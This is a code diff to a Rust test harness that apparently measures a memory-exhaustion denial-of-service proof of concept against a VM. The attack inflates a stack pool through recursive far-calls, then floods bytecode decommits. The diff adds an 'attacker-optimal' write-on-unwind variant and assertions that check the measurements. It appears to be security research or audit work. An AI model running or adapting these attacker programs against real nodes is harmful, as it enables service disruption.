@@ -104,41 +104,66 @@ fn load_codepage(imm: u16, dst: Register) -> Instruction<(), W> {
     )
 }
 
-/// Phase 1: self-recursive far-call to `MAT`, writing one slot per 16-slot sub-chunk before each
-/// recursion so every sub-chunk of every frame's stack materializes (2 MiB/frame). Passes
-/// `u32::MAX` so each level takes 63/64 of the remaining gas; at max depth every frame is live,
-/// and on unwind all those stacks land in the `StackPool` — where they stay.
-fn materializer() -> Prog {
+/// Phase 1: self-recursive far-call to `MAT`, materializing every sub-chunk of each frame's stack
+/// (one write per 16-slot sub-chunk = 2 MiB/frame). Passes `u32::MAX`, so each level takes 63/64 of
+/// what remains.
+///
+/// `write_on_unwind` picks WHEN a frame materializes, and it matters a lot:
+///   * `false` — before recursing. The write cost is then subtracted *before* the 63/64 decay at
+///     every deeper level, so it compounds and caps depth (~166 frames @20M).
+///   * `true`  — after its callee returns. `naked_ret` credits the callee's `leftover_gas` back to
+///     the caller, so the subtree hands its unspent gas back and the same budget materializes far
+///     more frames (~216 @20M, i.e. **1.36x more pool**). Registers are clobbered by the return,
+///     but the writes only use r0 (hardwired zero), so they are still valid there.
+/// Default is `true`: it is the attacker-optimal shape, and measured within ~4% of the analytic
+/// bound (writers in [d, D] <= g_d / cost_per_frame, maximized shallow => ~225 frames @20M).
+fn materializer(write_on_unwind: bool) -> Prog {
     let r0 = Register::new(0);
     let r_abi = Register::new(1);
     let r_dst = Register::new(2);
+    let writes = |code: &mut Vec<Instruction<(), W>>| {
+        for j in 0..NUM_SUBCHUNKS {
+            code.push(Instruction::from_add(
+                Register1(r0).into(),
+                Register2(r0),
+                AbsoluteStack(RegisterAndImmediate {
+                    immediate: j.saturating_mul(16),
+                    register: r0,
+                })
+                .into(),
+                args(RICH_COST),
+                false,
+                false,
+            ));
+        }
+    };
     let mut code = vec![load_codepage(0, r_abi), load_codepage(1, r_dst)];
-    for j in 0..NUM_SUBCHUNKS {
-        code.push(Instruction::from_add(
-            Register1(r0).into(),
-            Register2(r0),
-            AbsoluteStack(RegisterAndImmediate {
-                immediate: j.saturating_mul(16),
-                register: r0,
-            })
-            .into(),
-            args(RICH_COST),
+    if write_on_unwind {
+        // 2: recurse first; both success and OOG land on the writes at index 3.
+        code.push(Instruction::from_far_call::<opcodes::Normal>(
+            Register1(r_abi),
+            Register2(r_dst),
+            Immediate1(3),
             false,
             false,
+            args(FAR_CALL_COST),
         ));
+        writes(&mut code);
+        code.push(Instruction::from_ret(Register1(r0), None, args(RICH_COST)));
+    } else {
+        writes(&mut code);
+        let handler_idx = 2 + NUM_SUBCHUNKS + 2; // far, ret, [handler]
+        code.push(Instruction::from_far_call::<opcodes::Normal>(
+            Register1(r_abi),
+            Register2(r_dst),
+            Immediate1(handler_idx),
+            false,
+            false,
+            args(FAR_CALL_COST),
+        ));
+        code.push(Instruction::from_ret(Register1(r0), None, args(RICH_COST)));
+        code.push(Instruction::from_ret(Register1(r0), None, args(RICH_COST)));
     }
-    let far_idx = 2 + NUM_SUBCHUNKS;
-    let handler_idx = far_idx + 2; // far, ret, [handler]
-    code.push(Instruction::from_far_call::<opcodes::Normal>(
-        Register1(r_abi),
-        Register2(r_dst),
-        Immediate1(handler_idx),
-        false,
-        false,
-        args(FAR_CALL_COST),
-    ));
-    code.push(Instruction::from_ret(Register1(r0), None, args(RICH_COST)));
-    code.push(Instruction::from_ret(Register1(r0), None, args(RICH_COST)));
     let dst = U256::from_big_endian(MAT.as_bytes());
     Program::from_raw(code, vec![abi_gas(u32::MAX), dst])
 }
@@ -185,7 +210,15 @@ fn driver(g_rec: u32, g_flood: u32) -> Prog {
 /// Combined run: phase 1 inflates the pool, phase 2 floods `n` distinct bytecodes on top of it.
 /// `vm_gas` is the whole driver frame's budget — set it to N for the 1-tx case and to ~2N for the
 /// 2-tx case.
-fn run_stack_then_flood(n: u64, s: usize, base: u64, g_rec: u32, g_flood: u32, vm_gas: u32) -> Out {
+fn run_stack_then_flood(
+    n: u64,
+    s: usize,
+    base: u64,
+    g_rec: u32,
+    g_flood: u32,
+    vm_gas: u32,
+    write_on_unwind: bool,
+) -> Out {
     let words = s / 32;
     let mut storage = build_storage(n, s, base);
     // Wire the two pinned attacker programs so far-calls to them resolve (an unwired address would
@@ -200,7 +233,7 @@ fn run_stack_then_flood(n: u64, s: usize, base: u64, g_rec: u32, g_flood: u32, v
         .insert(code_info_key(U256::from_big_endian(ATTACKER.as_bytes())), u256_to_h256(att_info));
     // Pinned => program_cache hit, so neither attacker program adds a decode term to the flood's.
     let mut pinned = HashMap::new();
-    pinned.insert(mat_info, materializer());
+    pinned.insert(mat_info, materializer(write_on_unwind));
     pinned.insert(att_info, flood_loop(base));
     pinned.insert(U256::from(ATTACKER_HASH), flood_loop(base));
     pinned.insert(U256::from(AA_HASH), aa_program());
@@ -246,6 +279,15 @@ fn fp_rv32_of(mass: f64, pcache_nat: f64, flood_nat: f64, stack_nat: f64) -> (f6
     (mass + pcache_rv32 + heap_nat + stack_nat, heap_nat)
 }
 
+/// Gas for the driver frame delivering `total` to its phases. A far-call passes only 63/64 of what
+/// the caller holds, so without >= g_flood/63 of headroom the flood phase runs short of its
+/// requested budget and decommits fewer victims than the reference it is differenced against — the
+/// `lfd` assertions below exist to catch exactly that. The headroom is harness scaffolding: a real
+/// attacker's entry frame would run a phase itself rather than delegate, paying no such tax.
+fn driver_gas(total: u64) -> u32 {
+    (total + total / 32 + 300_000).min(u32::MAX as u64) as u32
+}
+
 const MIB: f64 = (1u64 << 20) as f64;
 fn mb(bytes: f64) -> f64 {
     bytes / MIB
@@ -277,11 +319,14 @@ fn mem_dos_stack_flood_vmfast() {
     let rec_sweep = parse_sweep("MEM_DOS_REC_SWEEP", vec![0, 1_000_000, 2_000_000, 3_000_000, 5_000_000]);
     let base: u64 = 0x10000;
     let per_gas = per_gas_for(s);
+    // Attacker-optimal phase-1 shape by default; set MEM_DOS_WRITE_ORDER=in for the weaker one.
+    let write_on_unwind = std::env::var("MEM_DOS_WRITE_ORDER").map_or(true, |v| v != "in");
 
     println!("\n=== stack pool + decommit flood, CO-RESIDENT (real vm_fast::World) ===");
     println!("S={} KiB/contract, per_victim_gas={per_gas}. B_min(rv32)={b_min_rv32:.0} MiB.", s / 1024);
     println!("DUAL CAP: 768 MiB (verified current) and 950 MiB (override).");
     println!("stack term converts 1:1 native->rv32; flood instructions 16->12 B.");
+    println!("phase-1 shape: materialize {} (write_on_unwind={write_on_unwind})", if write_on_unwind { "ON UNWIND (attacker-optimal)" } else { "before recursing (weaker)" });
 
     // Reference: flood-ONLY at each N (g_rec = 0), the prior 'all-flood is the max' baseline.
     for &big_n in &n_sweep {
@@ -309,7 +354,8 @@ fn mem_dos_stack_flood_vmfast() {
                 base,
                 g_rec as u32,
                 g_flood as u32,
-                (big_n + 300_000).min(u32::MAX as u64) as u32,
+                driver_gas(big_n),
+                write_on_unwind,
             );
             let mass = (n as usize * s) as f64;
             let stack_nat = (comb.peak as f64 - f_only.peak as f64).max(0.0);
@@ -336,7 +382,8 @@ fn mem_dos_stack_flood_vmfast() {
                 v(768.0),
                 v(950.0)
             );
-            println!("      {} | flood-only {}", comb.extra, f_only.extra);
+            println!("      lfd comb={} vs flood-only={} (must match, else the differenced stack term is wrong) | {} | {}", comb.lfd, f_only.lfd, comb.extra, f_only.extra);
+            assert_eq!(comb.lfd, f_only.lfd, "combined run did not decommit the same victim count as the flood-only reference");
             if best.map_or(true, |(b, _)| tot > b) {
                 best = Some((tot, g_rec));
             }
@@ -359,7 +406,8 @@ fn mem_dos_stack_flood_vmfast() {
             base,
             big_n as u32,
             big_n as u32,
-            (2 * big_n + 600_000).min(u32::MAX as u64) as u32,
+            driver_gas(2 * big_n),
+            write_on_unwind,
         );
         let mass = (n as usize * s) as f64;
         let stack_nat = (comb.peak as f64 - f_only.peak as f64).max(0.0);
@@ -384,7 +432,8 @@ fn mem_dos_stack_flood_vmfast() {
             v(768.0),
             v(950.0)
         );
-        println!("      {} | flood-only {}", comb.extra, f_only.extra);
+        println!("      lfd comb={} vs flood-only={} | {} | {}", comb.lfd, f_only.lfd, comb.extra, f_only.extra);
+        assert_eq!(comb.lfd, f_only.lfd, "combined run did not decommit the same victim count as the flood-only reference");
         // The pool must actually have been built, else the phases mis-sequenced (see `run_stack_then_flood`).
         assert!(
             mb(stack_nat) > 40.0,
